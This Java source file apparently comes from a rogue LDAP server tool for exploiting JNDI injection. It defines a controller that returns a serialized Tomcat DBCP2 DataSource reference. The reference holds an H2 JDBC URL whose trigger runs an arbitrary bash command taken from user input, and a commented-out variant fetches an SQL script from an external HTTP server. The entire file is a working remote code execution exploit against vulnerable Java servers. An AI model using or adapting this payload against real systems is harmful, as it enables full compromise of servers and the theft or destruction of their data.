package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.naming.Reference;
import javax.naming.StringRefAddr;

import static artsploit.Utilities.serialize;

/**
 * Yields:
 * RCE via arbitrary bean creation in {@link org.apache.naming.factory.BeanFactory}
 * When bean is created on the server side, we can control its class name and setter methods,
 * so we can leverage {@link javax.el.ELProcessor#eval} method to execute arbitrary Java code via EL evaluation
 *
 * @see https://www.veracode.com/blog/research/exploiting-jndi-injections-java for details
 *
 * Requires:
 *  Tomcat 8+ or SpringBoot 1.2.x+ in classpath
 *  - tomcat-embed-core.jar
 *  - tomcat-embed-el.jar
 *
 * @author artsploit
 */

@LdapMapping(uri = {"/o=dbcp2h2"})
public class Dbcp2H2 implements LdapController {


    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        System.out.println("Sending LDAP ResourceRef result for " + base + " with dbcp2-h2-sql payload");

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        // This payload can be used to fetch an SQL file from an external HTTP server
        // specified via the --command user input.
        // String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '"+ Config.command +"'";

        String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(['bash', '-c', '"+ Config.command + "'])";
        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;" +
                "init=CREATE TRIGGER cmdExec BEFORE SELECT ON INFORMATION_SCHEMA.USERS AS $$" +
                javascript + " $$";

        Reference ref = new Reference("javax.sql.DataSource", "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory", null);
        ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
        ref.add(new StringRefAddr("url", url));
        ref.add(new StringRefAddr("username", "root"));
        ref.add(new StringRefAddr("password", "password"));
        ref.add(new StringRefAddr("initialSize", "1"));


        e.addAttribute("javaSerializedData", serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
